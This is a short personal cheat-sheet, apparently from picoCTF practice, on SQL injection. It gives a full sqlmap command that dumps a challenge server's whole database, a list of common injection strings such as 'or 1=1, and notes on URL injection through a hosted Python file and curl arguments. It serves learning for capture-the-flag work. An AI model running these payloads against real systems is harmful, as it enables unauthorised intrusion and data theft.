sqlmap (automated sql injection testing):
copy target request from burp -> run "sqlmap -r <target request> --level 5 --risk 3"
(can also use -l <log-file> on target burp log)
ex)
sqlmap \\
-u "http://2018shell.picoctf.com:28120/answer2.php" \\ (target URL)
--method POST \\ (target request method)
--data "answer=TestBestTest&debug=0" \\ (payload to send)
-p "answer" \\ (suspected injectable parameter)
--dbms=SQlite  \\ (SQL db for this request)
--not-string="Wrong." \\ (string in return data indicating a false query)
--dump-all (get all data)

common queries:
'or 1=1
or '1=1'
<correct-value>' --
"admin  " 
admin=
' SELECT * WHERE ... -- '

URL injection options:
host a python server with a file to execute and visit with url in browser
pipe command to upload in url
add curl arguments to url
